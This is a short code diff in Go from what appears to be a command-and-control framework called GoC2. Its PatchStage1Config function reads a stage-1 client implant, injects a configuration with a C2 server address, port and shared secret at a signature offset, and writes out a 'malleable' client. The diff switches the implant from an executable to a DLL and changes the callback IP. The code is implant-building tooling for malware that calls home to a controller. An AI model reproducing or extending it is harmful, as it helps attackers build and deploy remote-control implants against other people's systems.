@@ -65,13 +65,13 @@ func MultiplyString(s string, count int) string {
 }
 
 func PatchStage1Config() {
-	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\client.exe")
+	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\clientDLL.dll")
 	if err != nil {
 		log.Fatal(err)
 	}
 	// new config
 	conf := data.Config{}
-	conf.ServerHostName = "172.16.100.201"
+	conf.ServerHostName = "172.16.99.201"
 	conf.ServerPort = "5555"
 	conf.ServerSecret = "test"
 	stringConf, err := json.Marshal(conf)
@@ -84,7 +84,7 @@ func PatchStage1Config() {
 		log.Fatal(fmt.Errorf("Failed to find signature %s", Signature))
 	}
 	replaceSignature(b, stringConf, configOffset)
-	ioutil.WriteFile("C:\\tmp\\malleableclient.exe", b, 0644)
+	ioutil.WriteFile("C:\\tmp\\malleableclient.dll", b, 0644)
 }
 
 func PatchStage0Config() {
